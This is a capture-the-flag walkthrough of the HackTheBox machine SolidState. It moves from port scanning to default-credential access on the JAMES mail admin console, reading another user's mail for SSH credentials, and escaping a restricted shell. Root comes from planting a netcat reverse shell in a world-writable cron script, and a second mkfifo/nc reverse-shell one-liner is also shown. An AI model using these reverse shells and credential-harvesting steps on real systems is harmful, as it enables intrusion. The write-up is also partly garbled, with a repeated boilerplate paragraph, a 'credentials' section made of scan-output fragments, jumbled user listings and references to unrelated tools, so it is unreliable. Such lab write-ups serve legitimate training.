---
title: "HackTheBox - SolidState (Linux)"
date: 2026-02-27
description: "HackTheBox SolidState Linux writeup マシン解説。サービス列挙・初期足がかり・権限昇格経路を解説。"
categories: [HackTheBox, Linux]
tags: [privilege-escalation, rce]
mermaid: true
content_lang: ja
alt_en: /posts/htb-solidstate/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | 22/tcp (ssh), 25/tcp (smtp), 80/tcp (http), 110/tcp (pop3), 119/tcp (nntp), 4555/tcp (rsip), 25/tcp (smtp?), 110/tcp (pop3?) |
| 主な侵入経路 | Public exploit path involving CVE-2015-7611 |
| 権限昇格経路 | Local misconfiguration and credential reuse for privilege escalation |

## 偵察

- rustscan
- nmap
- telnet
- ssh
- python
This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
rustscan -a $ip -r 1-65535 --ulimit 5000
```

```bash
✅[19:13][CPU:11][MEM:48][TUN0:10.10.14.163][.../n0z0/work/htb/SolidState]
🐉 > rustscan -a $ip -r 1-65535 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/n0z0/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.108.195:22
Open 10.129.108.195:25
Open 10.129.108.195:4555
Open 10.129.108.195:119
Open 10.129.108.195:110
Open 10.129.108.195:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 19:18 JST
Initiating Ping Scan at 19:18
Scanning 10.129.108.195 [4 ports]
Completed Ping Scan at 19:18, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:18
Completed Parallel DNS resolution of 1 host. at 19:18, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:18
Scanning 10.129.108.195 [6 ports]
Discovered open port 4555/tcp on 10.129.108.195
Discovered open port 22/tcp on 10.129.108.195
Discovered open port 25/tcp on 10.129.108.195
Discovered open port 80/tcp on 10.129.108.195
Discovered open port 110/tcp on 10.129.108.195
Discovered open port 119/tcp on 10.129.108.195
Completed SYN Stealth Scan at 19:18, 0.29s elapsed (6 total ports)
Nmap scan report for 10.129.108.195
Host is up, received reset ttl 63 (0.25s latency).
Scanned at 2025-09-28 19:18:36 JST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 10 (416B) | Rcvd: 51 (2.488KB)

```

This command is used here to enumerate the exposed services and collect actionable fingerprints before exploitation. The focus is on discovering open ports, service versions, and protocol behavior that can guide the next attack decision. Key flags are kept visible so the same scan can be reproduced during validation or retesting.

```bash
grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
-oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
```

```bash
✅[19:10][CPU:27][MEM:47][TUN0:10.10.14.163][/home/n0z0]
🐉 > grc nmap -p- -sC -sV -T4 -A -Pn "$ip" \
  -oX "$HOME/work/scans/$(date +%Y%m%d-%H%M%S)_${ip}.xml"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 19:13 JST
Warning: 10.129.108.195 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.108.195
Host is up (0.24s latency).
Not shown: 65494 closed tcp ports (reset), 35 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldnt establish connection on port 25
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   251.00 ms 10.10.14.1
2   251.15 ms 10.129.108.195

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1374.01 seconds

```

💡 なぜ有効か  
High-quality reconnaissance turns broad network exposure into a short list of exploitable paths. Service/version context allows precision targeting instead of blind exploitation attempts.

## 初期足がかり

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
nc -vn $ip 25
```

```bash
✅[19:49][CPU:3][MEM:52][TUN0:10.10.14.163][/home/n0z0]
🐉 > nc -vn $ip 25                            
(UNKNOWN) [10.129.108.195] 25 (smtp) open
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sun, 28 Sep 2025 06:50:12 -0400 (EDT)
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
telnet $ip 4555
```

```bash
❌[4:58][CPU:2][MEM:69][TUN0:10.10.14.163][.../n0z0/work/htb/SolidState]
🐉 > telnet $ip 4555  
Trying 10.129.108.195...
Connected to 10.129.108.195.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
listusersExisting accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
User ../../../../../../../../etc/bash_completion.d added
```

`listusers
`setpassword mindy vpassword
This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
- telnet $ip 110
- USER mindy
- PASS vpassword
- LIST
- RETR 2
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
telnet $ip 110
```

```bash
❌[5:08][CPU:7][MEM:59][TUN0:10.10.14.163][.../n0z0/work/htb/SolidState]
🐉 > telnet $ip 110     
Trying 10.129.108.195...
Connected to 10.129.108.195.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS vpassword
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
Connection closed by foreign host.

```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
✅[0:24][CPU:12][MEM:36][TUN0:10.10.14.198][/home/n0z0]
🐉 > ssh mindy@$ip  
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
mindy@solidstate:~$ cat user.txt 
c06d02da2b0efe871cb25c34dec2e357
```

This step is executed to convert reconnaissance findings into direct code execution or authenticated access on the target. The expected result is a shell, a confirmed exploit condition, or credentials that move the attack forward. Outputs are preserved to verify that each transition from discovery to exploitation is technically reproducible.

```bash
ssh mindy@$ip -t 'bash --noprofile'
```

### CVE Notes

- **CVE-2015-7611**: A known vulnerability referenced in this chain and used as part of exploitation.

💡 なぜ有効か  
Initial access succeeds when a real weakness is chained to controlled execution, credential theft, or authenticated pivoting. Captured outputs and callbacks validate that compromise is reproducible.

## 権限昇格

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/mindy
/opt/tmp.py
/run/lock
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/run/user/1001/systemd/transient
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/tmp

```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
echo 'import os' > /opt/tmp.py
echo 'import sys' >> /opt/tmp.py
echo 'os.system("/bin/nc 10.10.14.198 4444 -e /bin/bash")' >> /opt/tmp.py
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
\rlwrap -cAri nc -lvnp 4444
root@solidstate:~# ls -la
cat root.txt
```

```bash
❌[2:12][CPU:2][MEM:41][TUN0:10.10.14.198][/home/n0z0]
🐉 > \rlwrap -cAri nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.198] from (UNKNOWN) [10.129.105.125] 36028
root@solidstate:~# root@solidstate:~# ls -la
total 52
drwx------  8 root root 4096 Sep 30 13:08 .
drwxr-xr-x 22 root root 4096 May 27  2022 ..
lrwxrwxrwx  1 root root    9 Nov 18  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  8 root root 4096 Apr 26  2021 .cache
drwx------ 10 root root 4096 Apr 26  2021 .config
drwx------  3 root root 4096 Apr 26  2021 .gnupg
-rw-------  1 root root 3610 May 27  2022 .ICEauthority
drwx------  3 root root 4096 Apr 26  2021 .local
drwxr-xr-x  2 root root 4096 Apr 26  2021 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Sep 30 13:08 root.txt
-rw-r--r--  1 root root   66 Aug 22  2017 .selected_editor
drwx------  2 root root 4096 Apr 26  2021 .ssh
root@solidstate:~# cat root.txt
91bbcb8af7faebe0851ef03099145691
```

This command is run to enumerate or abuse local trust boundaries and move from user context to elevated privileges. We are specifically validating permission weaknesses, risky binaries, or policy misconfigurations that permit escalation. Flag usage and resulting output are retained to clearly show why the privilege transition succeeds.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.198 4444>/tmp/f
```

💡 なぜ有効か  
Privilege escalation depends on trust boundary mistakes such as unsafe sudo rules, writable execution paths, SUID abuse, or credential reuse. Enumerating and validating these conditions is essential for reliable root/administrator access.

## 認証情報

- `Tool / Command`
- `n0z0/work/htb/SolidState]`
- `__  /  ___}`
- `github.com/RustScan/RustScan`
- `home/n0z0/.rustscan.toml"`
- `4555/tcp`
- `22/tcp`
- `25/tcp`
- `80/tcp`

## まとめ・学んだこと

- Validate external attack surface continuously, especially exposed admin interfaces and secondary services.
- Harden secret handling and remove plaintext credentials from reachable paths and backups.
- Limit privilege boundaries: audit SUID binaries, sudo rules, and delegated scripts/automation.
- Keep exploitation evidence reproducible with clear command logs and result validation at each stage.

## 参考文献

- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.org/
- Certipy: https://github.com/ly4k/Certipy
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- CVE-2015-7611: https://nvd.nist.gov/vuln/detail/CVE-2015-7611
